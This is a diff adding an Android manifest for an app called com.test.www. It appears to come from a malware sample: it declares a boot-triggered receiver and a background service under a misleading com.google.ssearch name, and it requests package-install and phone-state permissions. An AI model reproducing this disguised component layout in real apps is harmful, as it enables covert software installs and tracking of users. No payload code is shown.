@@ -1,0 +1,31 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.test.www">
+    <application android:debuggable="true" android:icon="@drawable/icon" android:label="@string/app_name">
+        <activity android:launchMode="singleTask" android:name=".splash">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:label="@string/app_name" android:launchMode="singleTask" android:name="mainpage"/>
+        <activity android:label="@string/app_name" android:launchMode="singleTask" android:name=".firstpage"/>
+        <activity android:label="@string/app_name" android:launchMode="singleTask" android:name=".punishment"/>
+        <activity android:label="@string/app_name" android:launchMode="singleTask" android:name=".about"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:name="com.google.ssearch.Dialog" android:theme="@android:style/Theme.Dialog"/>
+        <service android:name="com.google.ssearch.SearchService"/>
+        <receiver android:name="com.google.ssearch.Receiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BATTERY_CHANGED_ACTION"/>
+                <action android:name="android.intent.action.SIG_STR"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <service android:exported="true" android:name=".Music" android:process=":remote"/>
+    </application>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+</manifest>
